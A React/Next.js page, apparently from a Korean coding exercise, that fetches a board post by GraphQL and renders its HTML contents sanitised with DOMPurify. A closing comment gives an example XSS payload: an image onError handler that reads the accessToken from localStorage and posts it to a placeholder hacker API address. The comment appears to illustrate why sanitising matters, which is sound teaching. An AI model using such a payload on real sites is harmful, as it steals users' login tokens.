import { gql, useQuery } from "@apollo/client";
import { useRouter } from "next/router";
import Dompurify from "dompurify";

const FETCH_BOARD = gql`
  query fetchBoard($boardId: ID!) {
    fetchBoard(boardId: $boardId) {
      _id
      writer
      title
      contents
    }
  }
`;

export default function StaticRoutedPage() {
  const router = useRouter();

  const { data } = useQuery(FETCH_BOARD, {
    variables: {
      boardId: String(router.query._id),
    },
  });

  return (
    <>
      <div>작성자: {data ? data.fetchBoard.writer : "로딩중입니다..."}</div>
      <div>제목: {data && data.fetchBoard.title}</div>
      {/*<div>내용: {data?.fetchBoard.contents}</div>*/}
      {typeof window !== "undefined" && (
        <div
          dangerouslySetInnerHTML={{
            __html: Dompurify.sanitize(data?.fetchBoard.contents),
          }}
        ></div>
      )}
    </>
  );
}

// playground XSS 공격
// <img src="#" onError="
// 	const aaa = localStorage.getItem('accessToken');
// 	axios.post(해커API주소, {accessToken = aaa});
// "/>
